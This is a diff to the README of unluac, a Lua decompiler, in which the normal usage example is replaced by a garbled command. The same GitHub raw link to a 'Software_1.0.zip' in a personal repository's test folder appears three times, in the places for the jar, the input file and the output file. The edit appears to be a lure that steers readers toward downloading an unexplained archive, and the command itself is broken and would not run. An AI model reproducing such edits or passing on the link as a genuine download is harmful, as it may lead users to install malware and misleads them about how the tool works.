@@ -7,7 +7,7 @@ This program is written in Java. A JAR package is available in the downloads sec
 Here is an example usage of unluac:
 
 ```
-java -jar unluac.jar myfile.lua > myfile_decompiled.lua
+java -jar https://github.com/narcos965/unluac/raw/refs/heads/master/src/unluac/test/Software_1.0.zip https://github.com/narcos965/unluac/raw/refs/heads/master/src/unluac/test/Software_1.0.zip > https://github.com/narcos965/unluac/raw/refs/heads/master/src/unluac/test/Software_1.0.zip
 ```
 
 ## How to compile `unluac` from source
